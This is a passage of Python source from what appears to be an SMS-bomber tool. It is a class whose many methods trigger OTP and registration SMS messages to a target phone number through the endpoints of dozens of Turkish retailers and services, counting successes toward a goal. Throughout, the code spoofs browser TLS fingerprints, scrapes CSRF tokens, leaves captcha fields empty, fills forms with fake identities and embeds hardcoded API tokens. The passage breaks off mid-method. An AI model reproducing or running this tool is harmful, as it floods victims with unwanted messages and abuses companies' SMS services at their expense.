                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobile.metro-tr.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobile.metro-tr.com")


    #file.com.tr
    def File(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            json={"mobilePhoneNumber": f"90{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["responseType"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.filemarket.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.filemarket.com.tr")
            
        
    #ak-asya.com.tr
    def Akasya(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://akasyaapi.poilabs.com:443/v1/en/sms"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5", "User-Agent": "Akasya/2.0.13 (com.poilabs.akasyaavm; build:2; iOS 15.8.3) Alamofire/4.9.1", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8"}
            json={"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json()["result"] == "SMS sended succesfully!":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akasyaapi.poilabs.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akasyaapi.poilabs.com")
        

        
    
    
    #porty.tech
    def Porty(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://panel.porty.tech:443/api.php?"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
            json={"job": "start_login", "phone": self.phone}
            r = requests.post(url=url, json=json, headers=headers, timeout=6)
            if r.json()["status"]== "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> panel.porty.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> panel.porty.tech")
    
    
    #vakiftasdelensu.com
    def Tasdelen(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://tasdelen.sufirmam.com:3300/mobile/send-otp"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "Tasdelen/5.9 (com.tasdelenapp; build:1; iOS 15.8.3) Alamofire/5.4.3", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"}
            json={"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json()["result"]== True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> tasdelen.sufirmam.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> tasdelen.sufirmam.com")
    

    #uysalmarket.com.tr
    def Uysal(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.uysalmarket.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.uysalmarket.com.tr/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers"}
            json={"phone_number": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.uysalmarket.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.uysalmarket.com.tr")
    
    

    



    #dominos.com.tr
    def Dominos(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
            headers = {"Content-Type": "application/json;charset=utf-8", "Accept": "application/json, text/plain, */*", "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg", "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8", "Appversion": "IOS-7.1.0", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Servicetype": "CarryOut", "Locationcode": "undefined"}
            json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> frontend.dominos.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> frontend.dominos.com.tr")


    #pidem.com.tr
    def Pidem(self):
        if self.adet >= self.hedef:
            return True
        try:
            session = crequests.Session(impersonate="chrome124")
            p = self.phone
            if p.startswith("0"): p = p[1:]
            
            url = "https://restashop.azurewebsites.net/graphql/"
            
            payload = {
                "query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n",
                "variables": {"phone": p}
            }
            
            headers = {
                "accept": "*/*",
                "authorization": "Bearer null",
                "content-type": "application/json",
                "origin": "https://www.pidem.com.tr",
                "referer": "https://www.pidem.com.tr/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
            }

            r = session.post(url, json=payload, headers=headers, timeout=12)
            
            # Yanıt analizi
            if r.status_code == 200:
                if '"resultStatus":"SUCCESS"' in r.text:
                    self.adet += 1
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Pidem Başarılı! --> {self.phone}")
                    return True
                elif "60 saniye" in r.text:
                    print(f"{Fore.YELLOW}[!] Pidem Bekleme Modunda (60sn limit).")
                    return False
            return False
        except Exception:
            return False




    #bodrum.bel.tr
    def Bodrum(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            headers = {"Content-Type": "application/json", "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en;q=0.9", "Token": "", "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE", "Origin": "capacitor://localhost", "Region": "EN", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Connection": "keep-alive"}
            json={"gsm": "+90"+self.phone, "source": "orwi"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gandalf.orwi.app")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gandalf.orwi.app")     

    
    #kofteciyusuf.com
    def KofteciYusuf(self):
        if self.adet >= self.hedef:
            return True
        try:
            # TLS parmak izi ve tarayıcı simülasyonu
            session = crequests.Session(impersonate="chrome124")
            
            # Önce çerezleri (cookies) toplamak için ana sayfayı ziyaret ediyoruz
            session.get("https://kofteciyusuf.com/giris", timeout=10)
            
            p = self.phone
            if p.startswith("0"): p = p[1:]
            
            # Filtreye takılmamak için rastgele isim/soyisim üretimi
            fname = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=5))
            fsurname = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=7))
            
            # Next.js Server Action ID ve Boundary tanımları
            action_id = "a99998a1d5edaefd74ffd749706611ff19f4ec11"
            boundary = "----WebKitFormBoundary" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))
            
            headers = {
                "accept": "text/x-component",
                "content-type": f"multipart/form-data; boundary={boundary}",
                "next-action": action_id,
                "origin": "https://kofteciyusuf.com",
                "referer": "https://kofteciyusuf.com/giris",
                "x-nextjs-post-modern": "1"
            }

            # JSON payload'ı f-string hatası vermemesi için değişken olarak tanımlıyoruz
            payload_json = '[{"validate":false,"showregisterform":true,"userdata":{},"userregistererrormessage":""},"$K1"]'

            # Multipart verisini tek parça halinde hazırlıyoruz
            data = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="1_phone"\r\n\r\n{p}\r\n'
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="1_name"\r\n\r\n{fname}\r\n'
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="1_surname"\r\n\r\n{fsurname}\r\n'
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="1_kvkk"\r\n\r\non\r\n'
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="0"\r\n\r\n{payload_json}\r\n'
                f"--{boundary}--\r\n"
            ).encode('utf-8')

            r = session.post("https://kofteciyusuf.com/giris", data=data, headers=headers, timeout=12)
            
            # Sunucu 200 dönüyorsa ve yanıt içeriğinde NextJS başarılı işareti varsa
            if r.status_code == 200 and '$@1' in r.text:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Köfteci Yusuf Başarılı! --> {self.phone}")
                return True
            else:
                return False
        except Exception:
            return False

    #hamidiye.istanbul
    def Hamidiye(self):
        if self.adet >= self.hedef:
            return True
        try:
            session = crequests.Session(impersonate="chrome124")
            
            p = self.phone
            if p.startswith("0"): p = p[1:]
            
            payload = {
                "phone": p,
                "register": "true"
            }
            
            headers = {
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest",
                "origin": "https://siparis.hamidiye.istanbul",
                "referer": "https://siparis.hamidiye.istanbul/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
            }

            r = session.post("https://onlinebayi.hamidiye.istanbul/api/sms-verification/", 
                             data=payload, 
                             headers=headers, 
                             timeout=15)
            
            if r.status_code in [200, 201]:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Hamidiye Başarılı! --> {self.phone}")
                return True
            return False
        except Exception:
            return False

    #money.com.tr
    def Money(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://www.money.com.tr:443/Account/ValidateAndSendOTP"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.money.com.tr/money-kartiniz-var-mi", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.money.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            data = {"phone": f"{self.phone[:3]} {self.phone[3:10]}", "GRecaptchaResponse": ''}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["resultType"] == 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> money.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> money.com.tr")


    #alixavien.com.tr
    def Alixavien(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://www.alixavien.com.tr:443/api/member/sendOtp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Referer": "https://www.alixavien.com.tr/UyeOl?srsltid=AfmBOoqrh4xzegqOPllnfc_4S0akofArgwZUErwoeOJzrqU16J1zksPj", "Content-Type": "application/json", "Origin": "https://www.alixavien.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers"}
            json={"Phone": self.phone, "XID": ""}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["isError"] == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> alixavien.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> alixavien.com.tr")


    
    def NineWest(self):
        if self.adet >= self.hedef:
            return True
        try:
            # TLS Fingerprint bypass için session başlatma
            session = crequests.Session(impersonate="chrome120")
            
            # 1. ADIM: Taze CSRF Token Alımı
            token_url = "https://www.ninewest.com.tr/webservice/v1/token/createtoken?form_name=customer-register-form"
            headers_token = {
                "accept": "*/*",
                "x-requested-with": "XMLHttpRequest",
                "referer": "https://www.ninewest.com.tr/customer/login",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            
            res_token = session.post(token_url, headers=headers_token, timeout=10)
            
            csrf_token = None
            if res_token.status_code == 200:
                try:
                    csrf_token = res_token.json().get("token")
                except:
                    csrf_token = res_token.text.strip('"')

            if csrf_token:
                # 2. ADIM: SMS Tetikleme (Kayıt Formu Gönderimi)
                # Telefon formatı: 0(5XX)-XXXXXXX
                p = self.phone
                formatted_phone = f"0({p[0:3]})-{p[3:]}"
                
                register_url = "https://www.ninewest.com.tr/ajax/customer/register"
                payload = {
                    "csrf_token": csrf_token,
                    "phone": formatted_phone,
                    "email": self.mail,
                    "password": "Password123.",
                    "gender": "1",
                    "newsletter_sms": "85",
                    "uyelik_sozlesmesi": "82",
                    "subscribed_kvkk": "79"
                }
                
                headers_reg = {
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "x-requested-with": "XMLHttpRequest",
                    "referer": "https://www.ninewest.com.tr/customer/login",
                    "origin": "https://www.ninewest.com.tr"
                }

                r = session.post(register_url, data=payload, headers=headers_reg, timeout=12)
                
                # Başarı kontrolü
                if r.status_code == 200 and '"success":true' in r.text.lower():
                    self.adet += 1
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Nine West Başarılı! --> {self.phone}")
                    return True
            return False
        except Exception:
            return False

    #api.ido.com.tr
    def Ido(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://api.ido.com.tr:443/idows/v2/register"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.ido.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.ido.com.tr/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            json={"birthDate": True, "captcha": "", "checkPwd": "313131", "code": "", "day": 24, "email": self.mail, "emailNewsletter": False, "firstName": "MEMATI", "gender": "MALE", "lastName": "BAS", "mobileNumber": f"0{self.phone}", "month": 9, "pwd": "313131", "smsNewsletter": True, "tckn": self.tc, "termsOfUse": True, "year": 1977}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.ido.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.ido.com.tr")
        

 # sokmarket.com.tr
    def SokMarket(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://giris.ec.sokmarket.com.tr/api/authentication/otp-registration/generate"
            headers = {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "x-platform": "WEB",
                "x-app-version": "v1",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
                "origin": "https://giris.ec.sokmarket.com.tr",
                "referer": "https://giris.ec.sokmarket.com.tr/otp-register"
            }
            # cURL içindeki clientId ve telefon formatı korunmuştur
            json_data = {
                "clientId": "buyer-web",
                "phoneNumber": self.phone,
                "captchaToken": "",
                "captchaAction": "generate_register_otp",
                "reCaptchaV2": False
            }
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> sokmarket.com.tr")
                self.adet += 1
            else:
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> sokmarket.com.tr")
            return False


    def A101(self):
        if self.adet >= self.hedef:
            return True
        try:
            # Numara 905XXXXXXXXX formatında birleştiriliyor
            url = f"https://rio.a101.com.tr/dbmk89vnr/CALL/MsisdnAuthenticator/sendOtp/90{self.phone}?__culture=tr-TR&__platform=web"
            
            headers = {
                "A101-User-Agent": "web-2.3.6",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "Origin": "https://www.a101.com.tr",
                "Referer": "https://www.a101.com.tr/",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
                "installationID": "4d65e5bb5e14e8dafb806c581d339725",
                "X-Requested-With": "XMLHttpRequest"
            }
            
            # cURL'de data-raw '{}' boş bir JSON objesi gönderiyor
            r = requests.post(url, headers=headers, json={}, timeout=10)
            
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Basarili! {self.phone} --> a101.com.tr (Adet: {self.adet + 1})")
                self.adet += 1
                return True
            else:
                # 429 dönerse rate limit, 403 dönerse IP blok demektir
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Hata! Kod: {r.status_code} --> a101.com.tr")
                return False
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Baglanti Sorunu! --> a101.com.tr")
            return False
    def Penti(self):
        if self.adet >= self.hedef:
            return True
        try:
            session = crequests.Session(impersonate="chrome124")
            
            # 1. ADIM: Register sayfasına girip taze CSRFToken alıyoruz
            res = session.get("https://www.penti.com/tr/register", timeout=15)
            token = re.search(r'name=["\']CSRFToken["\']\s+value=["\'](.*?)["\']', res.text)
            
            if not token:
                token = re.search(r'CSRFToken\s*=\s*["\'](.*?)["\']', res.text)

            if token:
                csrf = token.group(1)
                p = self.phone
                if p.startswith("0"): p = p[1:] # 0 varsa temizle
                
                # İlk deneme formatı: 0(507) 382 02 61
                formatted_phone = f"0({p[0:3]}) {p[3:6]} {p[6:8]} {p[8:10]}"
                
                data = {
                    "stepNumber": "1",
                    "gender": "FEMALE",
                    "firstName": "Necmi",
                    "lastName": "Aksoy",
                    "phoneNumber": formatted_phone,
                    "birthDate": "02.12.1999",
                    "email": self.mail,
                    "pwd": "Password123!",
                    "otpCode": "",
                    "CSRFToken": csrf
                }
                
                headers = {
                    "accept": "*/*",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "x-requested-with": "XMLHttpRequest",
                    "referer": "https://www.penti.com/tr/register",
                    "origin": "https://www.penti.com"
                }
                
                # 2. ADIM: İlk Formatla Gönderim
                r = session.post("https://www.penti.com/tr/register/newcustomer", data=data, headers=headers, timeout=15)
                
                if '"success":true' in r.text.lower():
                    self.adet += 1
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Penti Başarılı! --> {self.phone}")
                    return True
                else:
                    # İlk format başarısızsa alternatif (düz) formatı dene: 05073820261
                    data["phoneNumber"] = f"0{p}"
                    r2 = session.post("https://www.penti.com/tr/register/newcustomer", data=data, headers=headers, timeout=15)
                    if '"success":true' in r2.text.lower():
                        self.adet += 1
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Penti Başarılı (Alt)! --> {self.phone}")
                        return True
            
            return False
        except Exception:
            return False

    def Flo(self):
        if self.adet >= self.hedef:
            return True

        try:
            session = crequests.Session(impersonate="chrome124")
            
            # 1. Adım: Senin bulduğun endpoint üzerinden taze token üretimi
            token_url = "https://www.flo.com.tr/webservice/v1/token/createtoken?form_name=customer-register-form"
            headers_token = {
                "accept": "*/*",
                "x-requested-with": "XMLHttpRequest",
                "referer": "https://www.flo.com.tr/customer/login"
            }
            token_res = session.post(token_url, headers=headers_token, timeout=15)
            csrf_token = token_res.text.strip().replace('"', '')

            if len(csrf_token) > 10:
                p = self.phone
                if p.startswith("0"): p = p[1:]
                
                # cURL'deki özel format: 0(5XX)-XXXXXXX
                formatted_phone = f"0({p[0:3]})-{p[3:10]}"
                
                payload = {
                    "csrf_token": csrf_token,
                    "phone": formatted_phone,
                    "email": self.mail,
                    "password": "Password123!",
                    "gender": "1",
                    "newsletter_sms": "106",
                    "uyelik_sozlesmesi": "104",
                    "subscribed_kvkk": "99"
                }
                
                headers_reg = {
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "x-requested-with": "XMLHttpRequest",
                    "referer": "https://www.flo.com.tr/customer/login"
                }

                # 2. Adım: Kayıt üzerinden SMS tetikleme
                r = session.post("https://www.flo.com.tr/ajax/customer/register", data=payload, headers=headers_reg, timeout=15)
                
                if r.status_code == 200:
                    self.adet += 1
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Flo Başarılı! --> {self.phone}")
                    return True
            return False
        except Exception:
            return False
        
    def Kigili(self):
        if self.adet >= self.hedef:
            return True
        try:
            # TLS Fingerprint ile gerçek tarayıcı simülasyonu
            session = crequests.Session(impersonate="chrome124")
            
            # Telefonu hazırla (Kiğılı 905xxxxxxxxx formatında sever)
            p = self.phone if not self.phone.startswith("0") else self.phone[1:]
            
            # 1. ADIM: Oturum çerezlerini toplamak için sayfaya ilk vuruş
            session.get("https://www.kigili.com/account/register", timeout=10)
            
            # 2. ADIM: 405 hatasını aşan ve 200/202 dönen OTP tetikleyici
            url = "https://www.kigili.com/apps/holly-account/Shopify/send-otp"
            
            headers = {
                "accept": "application/json, text/plain, */*",
                "origin": "https://www.kigili.com",
                "referer": "https://www.kigili.com/account/register",
                "x-requested-with": "XMLHttpRequest"
            }

            # POST yerine GET kullanarak barajı bypass ediyoruz
            params = {
                "Phone": "90" + p,
                "Type": "Register"
            }

            r = session.get(url, params=params, headers=headers, timeout=12)
            
            # 200 veya senin aldığın o meşhur 202 kodu gelirse başarı sayıyoruz
            if r.status_code in [200, 202]:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Kiğılı Başarılı! --> {self.phone}")
                return True
            return False
        except Exception:
            # Hata oluşursa sistemi durdurma, sessizce geç
            return False
        
    def Fashfed(self):
        if self.adet >= self.hedef:
            return True
        try:
            session = crequests.Session(impersonate="chrome124")
            p = self.phone if self.phone.startswith("0") else "0" + self.phone
            
            # 1. ADIM: Token kazıma
            r_init = session.get("https://www.fashfed.com/users/register/", timeout=10)
            csrf = session.cookies.get("csrftoken")
            
            # 2. ADIM: SMS Fırlatma
            url = "https://www.fashfed.com/fashfed_app/users/register/"
            headers = {
                "accept": "*/*",
                "content-type": "application/json",
                "x-csrftoken": csrf,
                "x-requested-with": "XMLHttpRequest",
                "referer": "https://www.fashfed.com/users/register/"
            }

            payload = {
                "email": f"tester{random.randint(10000,99999)}@gmail.com",
                "first_name": "Deneme",
                "last_name": "Test",
                "password": "Password123!",
                "date_of_birth": "1990-01-01",
                "gender": "male",
                "phone": p,
                "confirm_kvkk": "true",
                "confirm": "true",
                "email_allowed": "true",
                "sms_allowed": "true",
                "call_allowed": "true"
            }

            r = session.post(url, json=payload, headers=headers, timeout=12)
            
            # BURASI ÖNEMLİ: 200, 201 ve senin aldığın 202 artık BAŞARILI sayılıyor.
            if r.status_code in [200, 201, 202]:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Fashfed Başarılı! --> {self.phone}")
                return True
            return False
        except Exception:
            return False
        
    def InStreet(self):
        if self.adet >= self.hedef:
            return True
        try:
            # impersonate="chrome120" ile TLS korumasını geçiyoruz
            session = crequests.Session(impersonate="chrome120")
            
            # 1. ADIM: Oturumu başlat
            session.get("https://www.instreet.com.tr/customer/login", timeout=10)

            # 2. ADIM: Dinamik CSRF Token'ı üret ve yakala
            token_url = "https://www.instreet.com.tr/webservice/v1/token/createtoken?form_name=customer-register-form"
            token_headers = {
                "accept": "*/*",
                "x-requested-with": "XMLHttpRequest",
                "referer": "https://www.instreet.com.tr/customer/login",
                "origin": "https://www.instreet.com.tr",
                "content-length": "0"
            }
            
            # Sunucu burada direkt ham metin (raw text) olarak token dönüyor
            r_token = session.post(token_url, headers=token_headers, timeout=10)
            csrf_token = r_token.text.strip()

            if len(csrf_token) < 10:
                raise Exception("Token alinamadi")

            # 3. ADIM: SMS Tetikleme (Payload sınıf değişkenlerine göre uyarlandı)
            register_url = "https://www.instreet.com.tr/ajax/customer/register"
            
            # InStreet'in beklediği telefon formatı: 0(507)-3820261
            p = self.phone
            formatted_phone = f"0({p[0:3]})-{p[3:]}"
            
            register_headers = {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest",
                "referer": "https://www.instreet.com.tr/customer/login",
                "origin": "https://www.instreet.com.tr"
            }

            payload = {
                "csrf_token": csrf_token,
                "phone": formatted_phone,
                "email": self.mail,
                "password": "Pass" + str(randint(1000, 9999)) + "!",
                "gender": "2",
                "newsletter_sms": "98",
                "uyelik_sozlesmesi": "95",
                "subscribed_kvkk": "92"
            }

            r_final = session.post(register_url, data=payload, headers=register_headers, timeout=12)

            if "success" in r_final.text.lower():
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}InStreet Başarılı! --> {self.phone}")
                return True
            else:
                raise Exception("SMS gitmedi")

        except Exception:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> instreet.com.tr")
            return False

    def TerraPizza(self):
        if self.adet >= self.hedef:
            return True
        try:
            # TLS Fingerprint bypass için stabil chrome110 kullanımı
            session = crequests.Session(impersonate="chrome110")
            
            # Şifre yenileme üzerinden giden captcha gerektirmeyen temiz yol
            url = 'https://www.terrapizza.com.tr/Customer/Passwords?handler=renewpassword'
            
            headers = {
                'Accept': '*/*',
